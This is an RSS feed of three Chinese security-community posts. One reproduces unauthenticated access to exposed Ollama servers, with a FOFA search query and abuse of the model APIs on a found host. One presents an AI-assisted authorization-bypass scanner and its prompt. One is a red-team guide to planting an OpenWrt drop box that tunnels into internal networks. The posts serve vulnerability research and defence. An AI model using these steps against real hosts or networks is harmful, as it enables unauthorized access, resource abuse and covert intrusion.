<?xml version="1.0" encoding="UTF-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>火线 Zone-安全攻防社区</title><link>https://zone.huoxian.cn/</link><atom:link href="http://rss.wudifeixue.com/huoxian/zone" rel="self" type="application/rss+xml"></atom:link><description>火线 Zone-安全攻防社区 - Made with love by RSSHub(https://github.com/DIYgod/RSSHub)</description><generator>RSSHub</generator><webMaster>i@diygod.me (DIYgod)</webMaster><language>en</language><lastBuildDate>Wed, 19 Mar 2025 21:23:10 GMT</lastBuildDate><ttl>5</ttl><item><title>利用Ollama对Deepseek 模型进行攻击</title><description>&lt;h2&gt;0x01 组件简介&lt;/h2&gt;
&lt;p&gt;近期由于Deepseek爆火，大部分企业和个人都开始部署AI。Ollama是一个本地私有化部署大语言模型（LLM，如DeepSeek等）的运行环境和平台，简化了大语言模型在本地的部署、运行和管理过程,具有简化部署、轻量级可扩展、API支持、跨平台等特点，在AI领域得到了较为广泛的应用。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fofa语法：app=&quot;Ollama&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;0x02 漏洞描述&lt;/h2&gt;

&lt;p&gt;近日，Ollama存在安全漏洞，该漏洞源于默认未设置身份验证和访问控制功能，未经授权的攻击者可在远程条件下调用Ollama服务接口，执行包括但不限于敏感模型资产窃取、虚假信息投喂、模型计算资源滥用和拒绝服务、系统配置篡改和扩大利用等恶意操作。&lt;/p&gt;

&lt;h2&gt;0x03 影响版本&lt;/h2&gt;
&lt;p&gt;Ollama所有版本均受此漏洞影响。&lt;/p&gt;


&lt;h2&gt;0x04 漏洞验证&lt;/h2&gt;
&lt;p&gt;随机找一个靶机看看&lt;br&gt;
出现Ollama is running，即证明存在未授权访问的漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20250306/Yh4v/574X249/image.png&quot; title=&quot;&quot; alt=&quot;574X249/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h3&gt;漏洞验证&lt;/h3&gt;
&lt;p&gt;通过查看Ollama api文档，Ollama提供了多个API 端点，用于执行不同的操作&lt;/p&gt;

&lt;p&gt;详细情况查看：&lt;a href=&quot;https://ollama.cadn.net.cn/api.html&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://ollama.cadn.net.cn/api.html&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/api/generate 用于生成文本或内容。通常用于基于给定的输入生成响应或输出，例如生成对话回复、文章等。
/api/chat 专门用于聊天交互。用户可以通过此端点与模型进行对话，模型会根据输入生成相应的回复。
/api/create 用于创建新的模型或资源。可能涉及初始化一个新的模型实例或配置。
/api/ps(或者tags) 用于管理或查看模型的标签。标签可以帮助用户对模型进行分类或标记，便于管理和查找。
/api/show 用于显示模型或资源的详细信息。用户可以获取模型的配置、状态或其他相关信息。
/api/copy  用于复制模型或资源。用户可以通过此端点创建一个现有模型的副本。
/api/delete 用于删除模型或资源。用户可以通过此端点移除不再需要的模型或数据。
/api/pull 用于从&amp;nbsp;Ollama&amp;nbsp;下载模型。用户可以通过此端点将模型从远程服务器拉取到本地环境中。
/api/push 用于将模型上传到&amp;nbsp;Ollama。用户可以通过此端点将本地模型推送到远程服务器。
/api/embeddings 用于生成文本的嵌入向量。嵌入向量是文本的数值表示，通常用于机器学习任务中的特征提取。
/api/version 用于获取&amp;nbsp;Ollama&amp;nbsp;的版本信息。用户可以通过此端点查询当前使用的&amp;nbsp;Ollama&amp;nbsp;版本。&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;漏洞利用&lt;/h3&gt;
&lt;p&gt;在未授权情况，可以通过访问/api/ps（使用GET请求即可） 获取目前搭建的所有模型信息。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20250306/NUiH/1035X775/image.png&quot; title=&quot;&quot; alt=&quot;1035X775/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;通过返回信息可以看到采用的是deepseek-r1模型，通过刚才我们知道的接口端点信息，我们可以调用/api/chat（使用POST请求）来完成聊天请求，消耗资源。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20250306/Qdk2/1825X819/image.png&quot; title=&quot;&quot; alt=&quot;1825X819/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;通过引导deepseek回答问题的过程中也能造成一些信息的泄露&lt;/p&gt;

&lt;p&gt;所以在未授权的情况下，其他的接口都是可以用的，危害极大，可以通过调用那些危险接口进行操作，可对模型进行创建或删除的操作&lt;/p&gt;

&lt;h2&gt;0x05 漏洞影响&lt;/h2&gt;
&lt;p&gt;通过以上过程，我们可以看到该漏洞危害极大，且该漏洞利用难度也极低，可以通过未授权对大模型进行操作&lt;/p&gt;


&lt;h2&gt;0x06 修复建议&lt;/h2&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;p&gt;限制公网访问：尽量避免直接将 Ollama 服务端口（默认 11434）暴露在公网。&amp;nbsp;&amp;nbsp;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置网络访问控制：通过云安全组、防火墙等手段限制对 Ollama 服务端口的访问来源。仅允许可信的源 IP 地址连接 11434 端口，阻止非授权 IP 的访问请求。&amp;nbsp;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;

&lt;h2&gt;0X07 参考链接&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ollama/ollama/blob/main/docs/faq.md&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/ollama/ollama/blob/main/docs/faq.md&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;0x08 免责声明&lt;/h2&gt;
&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;本文所涉及的任何技术、信息或工具，仅供学习和参考之用。&lt;/p&gt;
 
&lt;p&gt;请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。&lt;/p&gt;
 
&lt;p&gt;作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;</description><link>https://zone.huoxian.cn/d/2979-ollamadeepseek</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2979-ollamadeepseek</guid><pubDate>Thu, 06 Mar 2025 04:03:10 GMT</pubDate><author>jylove</author><category>原创文章</category><category>漏洞复现</category><category>应用安全</category></item><item><title>将AI结合进越权扫描，助力SRC挖掘。</title><description>&lt;h3&gt;&lt;strong&gt;先置顶工具链接：&lt;a href=&quot;https://github.com/Ed1s0nZ/PrivHunterAI&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Ed1s0nZ/PrivHunterAI&lt;/a&gt;&lt;/strong&gt;&lt;/h3&gt;

&lt;h2&gt;一、附上自用的一个案例：&lt;/h2&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;PrivHunterAI扫描结果（该漏洞公网暴露资产暂未全部修复，所以重码一下）：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741059582-970847-241c5f92-b2d5-42ff-ac2d-5ea5a150a555.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/li&gt;
&lt;li&gt;将漏洞提交至CNNVD：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741072341-392268-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/li&gt;
&lt;li&gt;获得CNNVD-2024年度二级贡献奖，奖金2万&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741072278-716655-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/li&gt;&lt;/ol&gt;


&lt;h2&gt;二、为什么要做这个工具：&lt;/h2&gt;
&lt;p&gt;该工具在24年初就有一个初版，但是有很多局限：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741060398-813144-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
&lt;strong&gt;为什么初版工具不够用？&lt;/strong&gt;&lt;br&gt;
当时该版本设计比较直接：通过匹配鉴权关键字（如响应包B包含 “暂无查询权限”“权限不足” 等关键字，则判断为未越权）、以及对比两个响应的相似度（使用Levenshtein编辑距离计算文本相似度）来判断是否存在越权。它的逻辑简单，效率也不错，也帮我发现了很多越权漏洞，但问题同样明显：&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;关键词匹配太死板&lt;/strong&gt;&lt;br&gt;
这种方法只能抓住显式的权限提示，比如“权限不足”这样的明文信息。但是如果接口没有返回明确的提示，甚至返回的数据看起来“正常”，那初版工具就无能为力了。它的局限性在于，越权的本质是“数据泄露”，而不是单纯的“权限错误”。所以，它漏掉了很多隐性的越权漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态内容干扰了相似度计算&lt;/strong&gt;&lt;br&gt;
初版工具用的是 Levenshtein 编辑距离算法来计算响应包的相似度。这个算法在静态内容中表现不错，但一旦遇到动态生成的字段，比如时间戳、随机数、会话 ID 等，它就会被这些变化“带偏”。动态字段的干扰让相似度计算变得不靠谱，导致误报率飙升。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不支持HTTPS 和被动代理&lt;/strong&gt;&lt;br&gt;
初版工具还存在技术上的硬伤，比如不支持 HTTPS，也不支持被动代理。这些问题让它在现代网络环境中显得笨拙。很多目标系统都启用了 HTTPS，而初版工具无法解析加密流量。这种“断层”让它的适用范围大打折扣。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;人工筛查的工作量太大&lt;/strong&gt;&lt;br&gt;
即使初代工具能筛出一些疑似越权的结果，最终还是得靠人工二次筛查。问题是，扫描的结果数量往往很大，人工筛查的负担并不轻松。这种“半自动化”的方式，效率提升有限。&lt;/li&gt;&lt;/ol&gt;


&lt;p&gt;于是，试想有没有办法一定程度上解决以上问题，就想到了通过AI来辅助筛查。在匹配鉴权关键字的基础上，让AI来初筛一遍结果，可以节省人工筛查的工作量，也可以降低误报率。后续也一并调研了可以兼容https的方案。&lt;br&gt;
最后结合以上思路，写了PrivHunterAI这个工具。&lt;/p&gt;

&lt;h2&gt;三、PrivHunterAI 的工作流是怎么设计&lt;/h2&gt;
&lt;h3&gt;工作流程&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741068743-751853-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;关键词过滤&lt;/strong&gt;&lt;br&gt;
工具首先通过关键词（比如“权限不足”）过滤掉一些明显无越权的情况。这个步骤既节省了 AI 的计算资源，也提升了整体效率。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AI 高阶分析&lt;/strong&gt;&lt;br&gt;
如果关键词过滤没有结果，工具会把响应包交给 AI 进行深度分析。AI 会忽略动态字段，专注于非动态内容的结构和相关性。它会判断响应包是否包含敏感数据，是否符合预期，得出最终结论。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;输出结果&lt;/strong&gt;&lt;br&gt;
AI 的分析结果会以 JSON 格式输出，包括“越权成功”“越权失败”或者“无法判断”的结论，便于后续处理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;支持多种 AI 引擎&lt;/strong&gt;&lt;br&gt;
PrivHunterAI 支持调用多种 AI 引擎，比如 Kimi、DeepSeek 和通义千问等。&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;工具的意义&lt;/h3&gt;
&lt;p&gt;用 AI 解决传统自动化工具的局限。&lt;/p&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;AI 推动工具效率提升&lt;/strong&gt;&lt;br&gt;
传统自动化工具的效率提升是有上限的，因为它们依赖于规则和逻辑。而 AI 的引入，让工具可以从“规则驱动”转向“数据驱动”。AI 能够处理更复杂、更模糊的场景，这拓宽了工具的应用边界。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;效率与人力的平衡&lt;/strong&gt;&lt;br&gt;
PrivHunterAI 的较大亮点，是它让 AI 承担了重复性、耗时性的任务，而让人专注于更有价值的分析和决策。这种效率与人力的平衡，不仅提升了检测的精准度，还让整个流程更加高效。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;未来还有无限可能&lt;/strong&gt;&lt;br&gt;
PrivHunterAI 的 AI 模块仍然有很大的优化空间，比如通过强化学习不断优化分析策略，或者通过多模型融合提高检测的准确率。&lt;/li&gt;&lt;/ol&gt;

&lt;h2&gt;四、用法&lt;/h2&gt;
&lt;h3&gt;使用方法&lt;/h3&gt;
&lt;p&gt;1、下载源代码或 Releases；&lt;br&gt;
2、编辑根目录下的config.json文件，配置AI和对应的apiKeys（只需要配置一个即可）；（AI的值可配置qianwen、kimi、hunyuan、gpt、glm 或 deepseek） ；&lt;br&gt;
3、配置headers2（请求B对应的headers）；可按需配置suffixes、allowedRespHeaders（接口后缀白名单，如.js）；&lt;br&gt;
4、执行go build编译项目（下载的Releases则跳过），并运行二进制文件；&lt;br&gt;
5、首次启动后需安装证书以解析 HTTPS 流量，证书会在首次启动命令后自动生成，路径为 ~/.mitmproxy/mitmproxy-ca-cert.pem。安装步骤可参考 Python mitmproxy 文档：&lt;a href=&quot;https://docs.mitmproxy.org/stable/concepts-certificates/&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;About Certificates&lt;/a&gt;。&lt;br&gt;
6、BurpSuite 挂下级代理 127.0.0.1:9080（端口可在mitmproxy.go 的Addr:&quot;:9080&quot;, 中配置）即可开始扫描；&lt;br&gt;
7、终端和web界面均可查看扫描结果，前端查看结果请访问127.0.0.1:8222 。&lt;/p&gt;

&lt;h3&gt;配置文件介绍（config.json）&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741069053-676445-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h3&gt;输出效果&lt;/h3&gt;
&lt;p&gt;1、终端输出：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741069689-213789-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
2、前端输出（访问127.0.0.1:8222）：&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-04/1741069739-460596-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h2&gt;其他&lt;/h2&gt;
&lt;h3&gt;一个比较通用的越权检测Prompt&lt;/h3&gt;
&lt;p&gt;以下是一个比较通用的越权检测Prompt，可以根据自己测试系统做相应调整：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;role&quot;: &quot;你是一个AI，负责通过比较两个HTTP响应数据包来检测潜在的越权行为，并自行做出判断。&quot;,
  &quot;inputs&quot;: {
    &quot;reqA&quot;: &quot;原始请求A&quot;,
    &quot;responseA&quot;: &quot;账号A请求URL的响应。&quot;,
    &quot;responseB&quot;: &quot;使用账号B的Cookie（也可能是token等其他参数）重放请求的响应。&quot;,
    &quot;statusB&quot;: &quot;账号B重放请求的请求状态码。&quot;,
    &quot;dynamicFields&quot;: [&quot;timestamp&quot;, &quot;nonce&quot;, &quot;session_id&quot;, &quot;uuid&quot;, &quot;request_id&quot;]
  },
  &quot;analysisRequirements&quot;: {
    &quot;structureAndContentComparison&quot;: {
      &quot;urlAnalysis&quot;: &quot;结合原始请求A和响应A分析，判断是否可能是无需数据鉴权的公共接口（不作为主要判断依据）。&quot;,
      &quot;responseComparison&quot;: &quot;比较响应A和响应B的结构和内容，忽略动态字段（如时间戳、随机数、会话ID、X-Request-ID等），并进行语义匹配。&quot;,
      &quot;httpStatusCode&quot;: &quot;对比HTTP状态码：403/401直接判定越权失败（false），500标记为未知（unknown），200需进一步分析。&quot;,
      &quot;similarityAnalysis&quot;: &quot;使用字段对比和文本相似度计算（Levenshtein/Jaccard）评估内容相似度。&quot;,
      &quot;errorKeywords&quot;: &quot;检查responseB是否包含 &#39;Access Denied&#39;、&#39;Permission Denied&#39;、&#39;403 Forbidden&#39; 等错误信息，若有，则判定越权失败。&quot;,
      &quot;emptyResponseHandling&quot;: &quot;如果responseB返回null、[]、{}或HTTP 204，且responseA有数据，判定为权限受限（false）。&quot;,
      &quot;sensitiveDataDetection&quot;: &quot;如果responseB包含responseA的敏感数据（如user_id、email、balance），判定为越权成功（true）。&quot;,
      &quot;consistencyCheck&quot;: &quot;如果responseB和responseA结构一致但关键数据不同，判定可能是权限控制正确（false）。&quot;
    },
    &quot;judgmentCriteria&quot;: {
      &quot;authorizationSuccess (true)&quot;: &quot;如果不是公共接口，且responseB的结构和非动态字段内容与responseA高度相似，或者responseB包含responseA的敏感数据，则判定为越权成功。&quot;,
      &quot;authorizationFailure (false)&quot;: &quot;如果是公共接口，或者responseB的结构和responseA不相似，或者responseB明确定义权限错误（403/401/Access Denied），或者responseB为空，则判定为越权失败。&quot;,
      &quot;unknown&quot;: &quot;如果responseB返回500，或者responseA和responseB结构不同但没有权限相关信息，或者responseB只是部分字段匹配但无法确定影响，则判定为unknown。&quot;
    }
  },
  &quot;outputFormat&quot;: {
    &quot;json&quot;: {
      &quot;res&quot;: &quot;\&quot;true\&quot;, \&quot;false\&quot; 或 \&quot;unknown\&quot;&quot;,
      &quot;reason&quot;: &quot;清晰的判断原因，总体不超过50字。&quot;
    }
  },
  &quot;notes&quot;: [
    &quot;仅输出 JSON 格式的结果，不添加任何额外文本或解释。&quot;,
    &quot;确保 JSON 格式正确，便于后续处理。&quot;,
    &quot;保持客观，仅根据响应内容进行分析。&quot;,
    &quot;优先使用 HTTP 状态码、错误信息和数据结构匹配进行判断。&quot;,
    &quot;支持用户提供额外的动态字段，提高匹配准确性。&quot;
  ],
  &quot;process&quot;: [
    &quot;接收并理解原始请求A、responseA和responseB。&quot;,
    &quot;分析原始请求A，判断是否是无需鉴权的公共接口。&quot;,
    &quot;提取并忽略动态字段（时间戳、随机数、会话ID）。&quot;,
    &quot;对比HTTP状态码，403/401直接判定为false，500标记为unknown。&quot;,
    &quot;检查responseB是否包含responseA的敏感数据（如user_id、email），如果有，则判定为true。&quot;,
    &quot;检查responseB是否返回错误信息（Access Denied / Forbidden），如果有，则判定为false。&quot;,
    &quot;计算responseA和responseB的结构相似度，并使用Levenshtein编辑距离计算文本相似度。&quot;,
    &quot;如果responseB内容为空（null、{}、[]），判断可能是权限受限，判定为false。&quot;,
    &quot;根据分析结果，返回JSON结果。&quot;
  ]
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;工具跟新时间线&lt;/h3&gt;
&lt;p&gt;2025.02.18&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;⭐️新增扫描失败重试机制，避免出现漏扫；&lt;/li&gt;
&lt;li&gt;⭐️新增响应Content-Type白名单，静态文件不扫描；&lt;/li&gt;
&lt;li&gt;⭐️新增限制每次扫描向AI请求的最大字节，避免因请求包过大导致扫描失败。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;2025.02.25 -02.27&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;⭐️新增对URL的分析（初步判断是否可能是无需数据鉴权的公共接口）；&lt;/li&gt;
&lt;li&gt;⭐️新增前端结果展示功能。&lt;/li&gt;
&lt;li&gt;⭐️新增针对请求B添加其他headers的功能（适配有些鉴权不在cookie中做的场景）。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;2025.03.01&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;优化Prompt，降低误报率；&lt;/li&gt;
&lt;li&gt;优化重试机制，重试会提示类似:AI分析异常，重试中，异常原因： API returned 401: {&quot;code&quot;:&quot;InvalidApiKey&quot;,&quot;message&quot;:&quot;Invalid API-key provided.&quot;,&quot;request_id&quot;:&quot;xxxxx&quot;}，每10秒重试一次，重试5次失败后放弃重试（避免无限重试）。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;2025.03.03&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;💰成本优化：在调用 AI 判断越权前，新增鉴权关键字（如 “暂无查询权限”“权限不足” 等）过滤环节，若匹配到关键字则直接输出未越权结果，节省 AI tokens 花销，提升资源利用效率;&lt;/li&gt;&lt;/ul&gt;

&lt;h2&gt;结尾&lt;/h2&gt;
&lt;p&gt;大家有时间的话可以试用一下这款小工具，有任何不足的地方可以提交issue。希望这款工具可以助力大家更方便的挖掘更多越权漏洞。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2978-aisrc</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2978-aisrc</guid><pubDate>Tue, 04 Mar 2025 06:45:10 GMT</pubDate><author>Ed1s0n</author><category>原创文章</category><category>应用安全</category><category>tool</category><category>挖洞姿势</category><category>tools</category></item><item><title>红队实战：谈一谈红队中的钓鱼姿势实战版</title><description>&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;红队钓鱼社工姿势关于近源场景的详细实战案例来了，这里先简单介绍一点儿小设备，这种工具非BadUSB类的，毕竟badusb的那种方式放在七八年前还好使，现在拿出来玩儿玩儿可以，实战中还是算了，成本高收益小。&lt;/p&gt;

&lt;p&gt;但是关于开发板的妙用在这个时候的优势就体现出来了，盒子类的设备利用好了在红队中的作用是巨大的。&lt;/p&gt;

&lt;h4&gt;设备&lt;/h4&gt;

&lt;p&gt;操作系统为OpenWrt 系统，目前现在二开以及一部分IOT类的设备都是这种的操作系统，举个简单的例子，医院以及部分超市的扫码枪。&lt;/p&gt;

&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;cat /etc/os-release&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740969980-924473-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;更新源&lt;/h5&gt;

&lt;p&gt;添加防火墙的策略，出口放通，添加路由&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970076-635487-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h6&gt;步骤&lt;/h6&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;备份现有配置文件&lt;/strong&gt;（以防出现问题时可以恢复）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   cp /etc/opkg/customfeeds.conf /etc/opkg/customfeeds.conf.bak&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;编辑 &lt;code&gt;customfeeds.conf&lt;/code&gt; 文件&lt;/strong&gt;：&lt;/p&gt;

   &lt;p&gt;您可以使用 &lt;code&gt;vi&lt;/code&gt; 或 &lt;code&gt;nano&lt;/code&gt; 编辑器来编辑文件。假设您的系统上已经安装了 &lt;code&gt;vi&lt;/code&gt; 编辑器：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;   vi /etc/opkg/customfeeds.conf&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;添加阿里云的源&lt;/strong&gt;：&lt;/p&gt;

   &lt;p&gt;在文件中添加或修改如下内容：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;   src/gz openwrt_core https://mirrors.aliyun.com/openwrt/releases/23.05.2/targets/rockchip/armv8/packages
   src/gz openwrt_base https://mirrors.aliyun.com/openwrt/releases/23.05.2/packages/aarch64_generic/base
   src/gz openwrt_luci https://mirrors.aliyun.com/openwrt/releases/23.05.2/packages/aarch64_generic/luci
   src/gz openwrt_packages https://mirrors.aliyun.com/openwrt/releases/23.05.2/packages/aarch64_generic/packages
   src/gz openwrt_routing https://mirrors.aliyun.com/openwrt/releases/23.05.2/packages/aarch64_generic/routing
   src/gz openwrt_telephony https://mirrors.aliyun.com/openwrt/releases/23.05.2/packages/aarch64_generic/telephony&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;保存并退出编辑器&lt;/strong&gt;：&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;更新软件包列表&lt;/strong&gt;：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;   opkg update&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&lt;/ol&gt;

&lt;h6&gt;方法二&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;wget https://github.com/josedelinux/openwrt-jdk/releases/download/0.0.2/openjdk-8_aarch64.tar.gz
tar -zxvf openjdk-8_aarch64.tar.gz
vi /etc/profile

添加
export JAVA_HOME=解压的路径
export PATH=$JAVA_HOME/bin:$PATH

保存后更新配置文件
source /etc/profile
java -version&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970139-958972-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h3&gt;连接说明&lt;/h3&gt;

&lt;h4&gt;连接无线wifi&lt;/h4&gt;

&lt;p&gt;初始化直接连接无线wifi，后期无线wifi的密码可以自行设置。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970159-41832-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;默认密码root/password，登录后默认界面如图所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970183-461713-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;状态&lt;/h4&gt;

&lt;p&gt;状态功能显示box的网路连接状态以及无线的连接状态以及网卡的状态情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970200-200526-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;路由&lt;/h5&gt;

&lt;p&gt;路由显示IPV4的路由&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970230-372560-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;配置仅需要配置两点&lt;/h5&gt;

&lt;ul&gt;&lt;li&gt;接口-》配置接口spy口&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970261-256318-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这里需要配置正确的ip地址，&lt;strong&gt;ip设置为与直连终端同段同掩码&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;网关一定要记得配置，否则无法跨段访问。更新完配置需要保存配置。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;网络-》防火墙-》NAT规则&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970283-477765-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;需要配置子网要访问的目的地址的范围，且操作需要配置自动重写源地址。&lt;/p&gt;

&lt;h5&gt;隧道搭建&lt;/h5&gt;

&lt;p&gt;这里可以选择任何隧道，操作系统是自己的，方便操作的话哪一种形式都可以进行，这里我选择的方式是选择的nps。&lt;/p&gt;

&lt;p&gt;客户端一直挂起&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970303-648866-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;接上无线网卡实现穿透&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970317-306286-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

